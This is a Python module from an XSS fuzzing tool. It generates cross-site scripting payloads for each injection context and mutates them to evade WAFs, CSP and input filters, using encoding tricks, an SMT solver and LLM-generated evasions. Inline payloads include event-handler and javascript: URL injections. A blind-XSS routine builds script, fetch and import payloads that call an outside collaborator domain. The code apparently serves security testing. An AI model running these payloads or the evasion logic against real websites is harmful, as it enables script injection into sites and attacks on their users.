"""Payload generator."""
import json
import os
import shutil
import subprocess
from typing import List, Dict, Any, Optional
from pathlib import Path
from fuzzer.strategy import Strategy, StrategyProfile
from fuzzer.mutation_engine import MutationEngine
from fuzzer.payload_knowledge_base import PayloadKnowledgeBase, XSSCategory, InjectionContext
from fuzzer.autonomous_xss_brain import AutonomousXSSBrain, BrainAnalysisReport


class PayloadGenerator:
    """Generate context-aware, filter-bypassing payloads."""
    
    GRAMMAR_DIR = Path(__file__).parent / "payload_grammar"
    TOKEN_PLACEHOLDER = "{{TOKEN}}"
    XSS_CALLBACK = "__XSS__"
    
    # Context type to grammar file mapping
    CONTEXT_GRAMMAR_MAP = {
        'HTML_TEXT': 'html_text.json',
        'HTML_COMMENT': 'html_comment.json',
        'HTML_RCDATA': 'html_rcdata.json',
        'ATTR_QUOTED': 'attr_quoted.json',
        'ATTR_UNQUOTED': 'attr_unquoted.json',
        'EVENT_HANDLER_ATTR': 'event_handler.json',
        'JS_STRING_LITERAL': 'js_string.json',
        'JS_IDENTIFIER': 'js_string.json',
        'JS_TEMPLATE_LITERAL': 'js_template_literal.json',
        'TEMPLATE_LITERAL': 'js_template_literal.json',
        'JSON_VALUE': 'json_value.json',
        'URL_FRAGMENT': 'url_context.json',
        'URL_QUERY': 'url_context.json',
        'CSTI': 'csti_templates.json',
        'DOM_CLOBBERING': 'dom_clobbering.json',
        'PROTOTYPE_POLLUTION': 'prototype_pollution.json',
        'MUTATION_XSS': 'mxss_advanced.json',
        'CSP_BYPASS': 'csp_bypasses.json',
        'WAF_EVASION': 'waf_evasion.json',
    }
    
    def __init__(self):
        """Initialize payload generator."""
        self._grammar_cache = {}
        self._brain = AutonomousXSSBrain(callback_name=self.XSS_CALLBACK)
        self._load_all_grammars()
    
    def _load_all_grammars(self):
        """Load all grammar files into cache."""
        for grammar_file in self.GRAMMAR_DIR.glob("*.json"):
            try:
                with open(grammar_file, 'r', encoding='utf-8') as f:
                    grammar_name = grammar_file.stem
                    self._grammar_cache[grammar_name] = json.load(f)
            except Exception as e:
                print(f"Error loading grammar {grammar_file}: {e}")
    
    def _load_grammar(self, context_type: str) -> List[str]:
        """Load grammar for a context type.
        
        Args:
            context_type: Context type string
            
        Returns:
            List of payload templates
        """
        grammar_file = self.CONTEXT_GRAMMAR_MAP.get(context_type)
        if not grammar_file:
            # Default to HTML_TEXT if unknown
            grammar_file = 'html_text.json'
        
        grammar_name = Path(grammar_file).stem
        return self._grammar_cache.get(grammar_name, [])
    
    def generate_autonomous_payloads(
        self,
        context_type: str,
        token: str,
        filter_profile: Optional[Dict[str, Any]] = None,
        csp_rules: Optional[Dict[str, Any]] = None,
        frameworks: Optional[List[str]] = None,
        sinks: Optional[List[str]] = None,
        strategy: Strategy = Strategy.SMART_ADAPTIVE,
        max_payloads: int = 50,
    ) -> BrainAnalysisReport:
        """
        Generate autonomously synthesized and ranked payloads using the AutonomousXSSBrain.
        """
        return self._brain.synthesize_attack_chain(
            context_type=context_type,
            token=token,
            filter_profile=filter_profile,
            csp_rules=csp_rules,
            frameworks=frameworks,
            sinks=sinks,
            strategy=strategy,
            max_payloads=max_payloads,
        )

    def generate_payloads(
        self,
        context_type: str,
        token: str,
        strategy: Strategy = Strategy.QUICK_LIGHT,
        filter_profile: Optional[Dict[str, Any]] = None,
        max_payloads: Optional[int] = None
    ) -> List[str]:
        """Generate payloads for a context type.
        
        Args:
            context_type: Context type string
            token: Oracle token to inject
            strategy: Fuzzing strategy
            filter_profile: Filter profile dictionary (optional)
            max_payloads: Maximum number of payloads to generate
            
        Returns:
            List of generated payloads
        """
        # Get strategy profile
        profile = StrategyProfile.get_profile(strategy)
        max_count = max(1, max_payloads or profile.get('max_payloads_per_context', 50))
        
        # Check if context is preferred for this strategy
        if not StrategyProfile.should_use_payload(strategy, context_type, ""):
            return []
        
        # Load grammar templates
        templates = self._load_grammar(context_type)
        
        # Filter templates based on strategy
        filtered_templates = []
        for template in templates:
            if StrategyProfile.should_use_payload(strategy, context_type, template):
                # Apply CSP check if rules are provided
                if filter_profile and 'csp_rules' in filter_profile:
                    csp = filter_profile['csp_rules']
                    template_lower = template.lower()
                    
                    # If inline scripts are disabled, drop <script>
                    if not csp.get('allow_inline_scripts', True) and '<script' in template_lower:
                        continue
                        
                    # If event handlers are disabled, drop inline event attributes
                    if not csp.get('allow_event_handlers', True) and any(h in template_lower for h in ['onload', 'onerror', 'onclick', 'onmouseover', 'onfocus']):
                        continue
                        
                    # If javascript: urls are disabled, drop it
                    if not csp.get('allow_javascript_urls', True) and 'javascript:' in template_lower:
                        continue
                        
                filtered_templates.append(template)

        if filter_profile:
            blocked_tokens = filter_profile.get('blocked_tokens', [])
            if blocked_tokens:
                def count_blocked(tpl: str) -> int:
                    tpl_lower = tpl.lower()
                    penalty = 0
                    for token_val in blocked_tokens:
                        if token_val.lower() in tpl_lower:
                            if len(token_val) > 1:
                                penalty += 10
                            else:
                                penalty += 1
                    return penalty
                filtered_templates.sort(key=count_blocked)
        
        if not filtered_templates and not (strategy in [Strategy.GENETIC_EVOLUTIONARY, Strategy.MAX_COVERAGE] or (filter_profile and (filter_profile.get('blocked_tokens') or filter_profile.get('waf_detected')))):
            return []
        
        # Generate payloads from templates
        payloads = []
        
        # Polyglot-First Triage: Insert high-density multi-context mega-polyglot for immediate 1-shot execution check
        if strategy in [Strategy.POLYGLOT_FIRST, Strategy.SMART_ADAPTIVE]:
            try:
                from fuzzer.polyglot_triage import PolyglotTriageEngine
                triage_payload = PolyglotTriageEngine.get_triage_payload(token=token, callback_name=self.XSS_CALLBACK)
                payloads.append(triage_payload)
            except Exception:
                pass

        # Verified CVE Bypasses from AutomataLearner
        if filter_profile and filter_profile.get('verified_cve_bypasses'):
            for cve_bp in filter_profile['verified_cve_bypasses']:
                payloads.append(cve_bp.replace("{TOKEN}", token))

        # SMT Bypass Solver: derive a bypass from the filter's own algebra (proven, not guessed).
        # A SAT witness is the highest-confidence candidate; UNSAT means we can skip this context.
        if filter_profile and (filter_profile.get('blocked_tokens') or filter_profile.get('blocked_chars')
                               or filter_profile.get('max_reflection_length')):
            try:
                from analysis_engine.smt_bypass_solver import SMTBypassSolver, FilterConstraints, SolveStatus
                fc = FilterConstraints(
                    blocked_substrings=set(filter_profile.get('blocked_tokens', []) or []),
                    blocked_chars=set(filter_profile.get('blocked_chars', []) or []),
                    blocked_regexes=list(filter_profile.get('waf_regexes', []) or []),
                    max_length=filter_profile.get('max_reflection_length'),
                )
                smt_sol = SMTBypassSolver().solve(context_type, fc, token)
                if smt_sol.status == SolveStatus.SAT and smt_sol.witness and smt_sol.verified:
                    payloads.insert(0, smt_sol.witness)  # prioritize the proven bypass
                elif smt_sol.status == SolveStatus.UNSAT:
                    # No breakout of any modeled shape survives — record so the caller can save requests.
                    filter_profile['smt_unsat'] = smt_sol.unsat_core
            except Exception:
                pass

        # Local Grammar Fuzzer: Seed with zero-cost locally verified fixpoint / mXSS candidates
        if strategy in [Strategy.GENETIC_EVOLUTIONARY, Strategy.SMART_ADAPTIVE, Strategy.MAX_COVERAGE]:
            try:
                from fuzzer.local_grammar_fuzzer import LocalGrammarFuzzer
                blocked = set((filter_profile or {}).get("blocked_tokens", []))
                local_candidates = LocalGrammarFuzzer.evolve_grammar_population(
                    token=token,
                    generations=1,
                    population_size=10,
                    blocked_chars=blocked
                )
                payloads.extend(local_candidates)
            except Exception:
                pass

        # Pre-seed initial fuzzer generation pool using LLM when using advanced strategies or active blocking/WAF is detected
        if strategy in [Strategy.GENETIC_EVOLUTIONARY, Strategy.MAX_COVERAGE] or (filter_profile and (filter_profile.get('blocked_tokens') or filter_profile.get('waf_detected'))):
            try:
                from backend_api.services.llm_service import LLMService
                llm_payloads = LLMService.generate_evasion_payloads(
                    context_type=context_type,
                    token=token,
                    filter_profile=filter_profile,
                    allow_fallback=True
                )
                if llm_payloads:
                    payloads.extend(llm_payloads)
            except Exception:
                pass

        # Seed from Autonomous Brain for deep / adaptive strategies
        if strategy in [Strategy.MAX_COVERAGE, Strategy.GENETIC_EVOLUTIONARY, Strategy.SMART_ADAPTIVE]:
            try:
                brain_report = self._brain.synthesize_attack_chain(
                    context_type=context_type,
                    token=token,
                    filter_profile=filter_profile,
                    strategy=strategy,
                    max_payloads=15,
                )
                payloads.extend([d.payload for d in brain_report.top_payloads])
            except Exception:
                pass

        mutation_strategy = StrategyProfile.get_mutation_strategy(strategy)
        
        base_payloads = []
        
        # Check for registered collaborator payload to generate blind XSS attempts
        try:
            from backend_api.routers.burp import active_collaborator_payloads
            if active_collaborator_payloads:
                collab_domain = active_collaborator_payloads[-1]
                blind_payloads = self._generate_blind_payloads(context_type, token, collab_domain)
                base_payloads.extend(blind_payloads)
        except Exception:
            pass

        mutated_payloads = []

        # CSP-aware scanning includes non-script gadget paths.
        if strategy == Strategy.CSP_AWARE:
            prototype_action = f'<img src=x onerror={self.XSS_CALLBACK}("{token}")>'
            base_payloads.extend(MutationEngine.apply_prototype_pollution(prototype_action))

        blocked_lower = {
            str(value).lower() for value in (filter_profile or {}).get("blocked_tokens", [])
        }
        allowed_lower = {
            str(value).lower() for value in (filter_profile or {}).get("allowed_tokens", [])
        }
        callback = f'{self.XSS_CALLBACK}("{token}")'
        if {"(", ")", "'", '"'}.issubset(blocked_lower) or "(" in blocked_lower or ")" in blocked_lower or (filter_profile and filter_profile.get("waf_detected")):
            # Tagged-template invocation survives quote/parenthesis/WAF blocking.
            base_payloads.insert(
                0,
                f"javascript:{self.XSS_CALLBACK}`{token}`",
            )
            base_payloads.insert(
                0,
                f"javascript:alert`{token}`",
            )
            base_payloads.insert(
                0,
                f"<svg><animate attributeName=x dur=1s onbegin={self.XSS_CALLBACK}`{token}`>",
            )
        if "javascript" in blocked_lower and {"config", "url"}.issubset(allowed_lower):
            iframe_callback = f'parent.{self.XSS_CALLBACK}("{token}")'
            base_payloads = MutationEngine.apply_extreme_clobbering_bypass(iframe_callback) + base_payloads

        # Adaptive mode intentionally works on a compact, high-signal template set.
        if strategy == Strategy.SMART_ADAPTIVE:
            filtered_templates = filtered_templates[:max_count]

        for template in filtered_templates:
            # Replace token placeholder
            payload = template.replace(self.TOKEN_PLACEHOLDER, token)
            protected_tokens = [token, self.XSS_CALLBACK]
            
            # Apply filter-aware mutations if filter profile provided
            if filter_profile:
                payload = self._apply_filter_aware_mutations(
                    payload,
                    filter_profile,
                    mutation_strategy,
                    protected_tokens=protected_tokens
                )
            
            base_payloads.append(payload)
            
            # Apply strategy-based mutations
            mutated = MutationEngine.apply_all_mutations(
                payload,
                mutation_strategy,
                protected_tokens=protected_tokens
            )
            if payload in mutated:
                mutated.remove(payload)
            mutated_payloads.extend(mutated)
        
        # Adaptive mode budget balancing
        if strategy == Strategy.SMART_ADAPTIVE:
            base_budget = max(1, (max_count + 1) // 2)
            payloads = list(dict.fromkeys(
                base_payloads[:base_budget]
                + payloads
                + mutated_payloads
                + base_payloads[base_budget:]
            ))
        else:
            payloads = list(dict.fromkeys(base_payloads + payloads + mutated_payloads))
        
        # AST Pre-Filtering: Filter out invalid JavaScript syntax to prevent CPU thrashing in headless browsers
        payloads = self._filter_invalid_js_syntax(payloads, context_type=context_type)
        
        # Limit payloads
        if len(payloads) > max_count:
            payloads = payloads[:max_count]
        
        return payloads

    def _filter_invalid_js_syntax(
        self,
        payloads: List[str],
        context_type: Optional[str] = None,
    ) -> List[str]:
        """Filter out payloads that contain invalid JavaScript syntax using Node.js."""
        # These are deliberately expression fragments that are valid only
        # inside an existing template literal. Parsing them as standalone JS
        # incorrectly removes every context-correct `${...}` candidate.
        if context_type in {"JS_TEMPLATE_LITERAL", "TEMPLATE_LITERAL"}:
            return payloads
        # Auto-repair syntactic breaks before validating to preserve mutated candidates
        try:
            from fuzzer.genetic import GeneticBreeder
            payloads = [GeneticBreeder.auto_repair_payload_syntax(p) for p in payloads]
        except Exception:
            pass
            
        # Check if node is installed and in path
        if not shutil.which('node'):
            return payloads
            
        node_script = """
        const fs = require('fs');
        try {
            const payloads = JSON.parse(fs.readFileSync(0, 'utf-8'));
            const results = payloads.map(payload => {
                let codeBlocks = [];
                if (payload.includes('<script')) {
                    const matches = payload.match(/<script[^>]*>([\\s\\S]*?)<\\/script>/gi);
                    if (matches) {
                        matches.forEach(m => {
                            const content = m.replace(/<script[^>]*>/i, '').replace(/<\\/script>/i, '');
                            codeBlocks.push(content);
                        });
                    }
                } else if (payload.match(/on[a-z]+=/i)) {
                    // Try to extract JavaScript from inline attributes
                    const quotedMatches = payload.match(/on[a-z]+=(['"])([\\s\\S]*?)\\1/gi);
                    const unquotedMatches = payload.match(/on[a-z]+=([^>\\s]+)/gi);
                    if (quotedMatches) {
                        quotedMatches.forEach(m => {
                            const content = m.replace(/on[a-z]+=/i, '').replace(/^['"]|['"]$/g, '');
                            codeBlocks.push(content);
                        });
                    } else if (unquotedMatches) {
                        unquotedMatches.forEach(m => {
                            codeBlocks.push(m.replace(/on[a-z]+=/i, ''));
                        });
                    }
                } else if (payload.toLowerCase().startsWith('javascript:')) {
                    codeBlocks.push(payload.substring(11));
                } else if (/^\\s*</.test(payload) || /^(?:__proto__|constructor(?:\\.|\\[))/.test(payload)) {
                    // HTML fragments and prototype-pollution key/value forms are valid non-JS outer shells
                } else {
                    let cleaned = payload.replace(/^['"`\\);,}\\s]+/, '').replace(/[\\/\\*-\\s]+$/, '');
                    if (cleaned) {
                        codeBlocks.push(cleaned);
                    }
                }

                for (const code of codeBlocks) {
                    try {
                        new Function(code);
                    } catch (e) {
                        if (e instanceof SyntaxError) {
                            return false;
                        }
                    }
                }
                return true;
            });
            console.log(JSON.stringify(results));
        } catch (err) {
            process.exit(1);
        }
        """
        
        try:
            proc = subprocess.Popen(
                ['node', '-e', node_script],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                encoding='utf-8'
            )
            stdout, stderr = proc.communicate(input=json.dumps(payloads), timeout=5)
            if proc.returncode == 0:
                validity_map = json.loads(stdout)
                return [payloads[i] for i in range(len(payloads)) if validity_map[i]]
        except Exception:
            pass
            
        return payloads
    
    def _apply_filter_aware_mutations(
        self,
        payload: str,
        filter_profile: Dict[str, Any],
        mutation_strategy: str,
        protected_tokens: Optional[List[str]] = None
    ) -> str:
        """Apply mutations based on filter profile."""
        blocked_tokens = filter_profile.get('blocked_tokens', [])
        normalization_behavior = filter_profile.get('normalization_behavior', [])
        waf_detected = filter_profile.get('waf_detected', False)
        
        if not blocked_tokens and not normalization_behavior and not waf_detected and 'probe_results' not in filter_profile:
            return payload
        
        # Extract character status from filter profile
        char_status = {}
        probe_results = filter_profile.get('probe_results', [])
        for probe in probe_results:
            name = probe.get('probe_name', '')
            if name.startswith('char_'):
                p_val = probe.get('payload', '')
                if len(p_val) == 7 and p_val.startswith('xss') and p_val.endswith('xss'):
                    c = p_val[3]
                    char_status[c] = {
                        'blocked': probe.get('blocked', False),
                        'escaped': probe.get('escaped', False),
                        'stripped': probe.get('stripped', False),
                        'reflected': probe.get('reflected', False),
                        'usable': probe.get('reflected', False) and not (probe.get('blocked', False) or probe.get('escaped', False) or probe.get('stripped', False))
                    }
        
        # Apply mutations to bypass blocked tokens if present
        payload_lower = payload.lower()
        if blocked_tokens:
            blocked_keywords = [t for t in blocked_tokens if len(t) > 1]
            has_blocked = any(token_val.lower() in payload_lower for token_val in blocked_keywords)
            if has_blocked:
                if mutation_strategy == 'unicode_hunt':
                    payload = MutationEngine._apply_to_unprotected(
                        payload,
                        protected_tokens,
                        lambda value: MutationEngine.apply_homoglyphs(value, 0.7)
                    )
                
                if any(token_val in payload_lower for token_val in ['script', 'onerror', 'onload', 'javascript']):
                    nested_variants = MutationEngine._expand_unprotected(
                        payload,
                        protected_tokens,
                        MutationEngine.apply_recursive_nesting
                    )
                    if nested_variants and nested_variants[0] != payload:
                        payload = nested_variants[0]
                    else:
                        split_variants = MutationEngine._expand_unprotected(
                            payload,
                            protected_tokens,
                            MutationEngine.apply_keyword_splitting
                        )
                        if split_variants:
                            payload = split_variants[0]
        
        if 'case_normalized' in normalization_behavior:
            payload = MutationEngine._apply_to_unprotected(
                payload,
                protected_tokens,
                MutationEngine.apply_mixed_case
            )
        if 'whitespace_removed' in normalization_behavior:
            payload = MutationEngine._apply_to_unprotected(
                payload,
                protected_tokens,
                lambda value: MutationEngine.apply_zero_width(value, 2)
            )
            
        if char_status:
            lparen_usable = char_status.get('(', {}).get('usable', True)
            rparen_usable = char_status.get(')', {}).get('usable', True)
            sq_usable = char_status.get("'", {}).get('usable', True)
            dq_usable = char_status.get('"', {}).get('usable', True)
            bt_usable = char_status.get('`', {}).get('usable', True)
            slash_usable = char_status.get('/', {}).get('usable', True)
            backslash_usable = char_status.get('\\', {}).get('usable', True)

            token = protected_tokens[0] if protected_tokens else ""

            if sq_usable and not dq_usable:
                payload = payload.replace('"', "'")
            elif dq_usable and not sq_usable:
                payload = payload.replace("'", '"')
            elif not sq_usable and not dq_usable:
                if bt_usable:
                    payload = payload.replace("'", "`").replace('"', '`')
                elif lparen_usable:
                    if backslash_usable:
                        import random
                        if random.random() < 0.5:
                            payload = MutationEngine.apply_string_hex_escapes(payload)
                        else:
                            payload = MutationEngine.apply_string_octal_escapes(payload)
                    else:
                        payload = MutationEngine.apply_string_from_char_code(payload)
                else:
                    import re
                    def string_to_regex_literal(match):
                        content = match.group(1)
                        if content.isalnum():
                            return f"/{content}/.source"
                        return match.group(0)
                    payload = re.sub(r'["\']([a-zA-Z0-9_-]+)["\']', string_to_regex_literal, payload)

            if not lparen_usable or not rparen_usable:
                if bt_usable:
                    import re
                    payload = re.sub(r'([a-zA-Z0-9_$]+)\(["\'`]?([^"\'`)]*)["\'`]?\)', r'\1`\2`', payload)
                elif token:
                    import re
                    if sq_usable:
                        throw_stmt = f"onerror={self.XSS_CALLBACK};throw'{token}'"
                    elif dq_usable:
                        throw_stmt = f'onerror={self.XSS_CALLBACK};throw"{token}"'
                    elif slash_usable:
                        throw_stmt = f"onerror={self.XSS_CALLBACK};throw/{token}/"
                    else:
                        throw_stmt = f"onerror={self.XSS_CALLBACK};throw {token}"
                    
                    payload = re.sub(rf'{self.XSS_CALLBACK}\(["\'`]?{re.escape(token)}["\'`]?\)', throw_stmt, payload)
        else:
            if 'quotes_escaped' in normalization_behavior or 'quotes_stripped' in normalization_behavior:
                if 'backslashes_escaped' not in normalization_behavior and 'backslashes_stripped' not in normalization_behavior:
                    payload = payload.replace("'", "\\'").replace('"', '\\"')
                else:
                    payload = payload.replace('"', '`').replace("'", '`')
                    
            if 'brackets_stripped' in normalization_behavior or '(' in blocked_tokens or ')' in blocked_tokens:
                import re
                payload = re.sub(r'([a-zA-Z0-9_$]+)\(([^)]*)\)', r'\1`\2`', payload)
        
        if waf_detected:
            payload = MutationEngine._apply_to_unprotected(
                payload,
                protected_tokens,
                lambda value: MutationEngine.apply_double_url_encoding(value, 0.4)
            )
            payload = MutationEngine._apply_to_unprotected(
                payload,
                protected_tokens,
                MutationEngine.apply_tag_nesting
            )
        
        if "javascript://" in payload:
            allowed_hosts = filter_profile.get('allowed_hosts', [])
            for token_val in filter_profile.get('allowed_tokens', []):
                if '.' in token_val and token_val not in allowed_hosts:
                    allowed_hosts.append(token_val)
            if allowed_hosts:
                import re
                payload = re.sub(r'javascript://([^/]+)/', f"javascript://{allowed_hosts[0]}/", payload)
        
        return payload
    
    def generate_for_contexts(
        self,
        contexts: List[Dict[str, Any]],
        token: str,
        strategy: Strategy = Strategy.QUICK_LIGHT,
        filter_profiles: Optional[Dict[int, Dict[str, Any]]] = None
    ) -> Dict[int, List[str]]:
        """Generate payloads for multiple contexts."""
        results = {}
        
        for context in contexts:
            context_id = context.get('id')
            context_type = context.get('context_type')
            endpoint_id = context.get('endpoint_id')
            
            if not context_id or not context_type:
                continue
            
            filter_profile = None
            if filter_profiles and endpoint_id:
                filter_profile = filter_profiles.get(endpoint_id)
            
            payloads = self.generate_payloads(
                context_type=context_type,
                token=token,
                strategy=strategy,
                filter_profile=filter_profile
            )
            
            results[context_id] = payloads
        
        return results
    
    def get_grammar_stats(self) -> Dict[str, int]:
        """Get statistics about loaded grammars."""
        return {
            name: len(templates)
            for name, templates in self._grammar_cache.items()
        }

    def _generate_blind_payloads(self, context_type: str, token: str, collab_domain: str) -> List[str]:
        """Generate blind XSS payloads targeting the specific context type."""
        templates = []
        if context_type == 'HTML_TEXT':
            templates = [
                f"<script src=\"http://t{self.TOKEN_PLACEHOLDER}.{collab_domain}/\"></script>",
                f"<img src=x onerror=\"fetch('http://t{self.TOKEN_PLACEHOLDER}.{collab_domain}/')\">",
                f"<svg onload=\"fetch('http://t{self.TOKEN_PLACEHOLDER}.{collab_domain}/')\">",
                f"<iframe src=\"http://t{self.TOKEN_PLACEHOLDER}.{collab_domain}/\"></iframe>",
                f"\"><script src=\"http://t{self.TOKEN_PLACEHOLDER}.{collab_domain}/\"></script>",
                f"\"><img src=x onerror=\"fetch('http://t{self.TOKEN_PLACEHOLDER}.{collab_domain}/')\">",
            ]
        elif context_type in ['ATTR_QUOTED', 'ATTR_UNQUOTED']:
            templates = [
                f"\" src=\"http://t{self.TOKEN_PLACEHOLDER}.{collab_domain}/\"",
                f"\" autofocus onfocus=\"fetch('http://t{self.TOKEN_PLACEHOLDER}.{collab_domain}/')\"",
                f"' src='http://t{self.TOKEN_PLACEHOLDER}.{collab_domain}/'",
                f"' autofocus onfocus='fetch(\"http://t{self.TOKEN_PLACEHOLDER}.{collab_domain}/\")'",
            ]
        elif context_type == 'EVENT_HANDLER_ATTR':
            templates = [
                f"fetch('http://t{self.TOKEN_PLACEHOLDER}.{collab_domain}/')",
                f"import('http://t{self.TOKEN_PLACEHOLDER}.{collab_domain}/')",
            ]
        elif context_type in ['JS_STRING_LITERAL', 'JS_IDENTIFIER']:
            templates = [
                f"\";fetch('http://t{self.TOKEN_PLACEHOLDER}.{collab_domain}/')//",
                f"';fetch('http://t{self.TOKEN_PLACEHOLDER}.{collab_domain}/')//",
                f"\";import('http://t{self.TOKEN_PLACEHOLDER}.{collab_domain}/')//",
                f"';import('http://t{self.TOKEN_PLACEHOLDER}.{collab_domain}/')//",
            ]
            
        payloads = [t.replace(self.TOKEN_PLACEHOLDER, token) for t in templates]
        return payloads
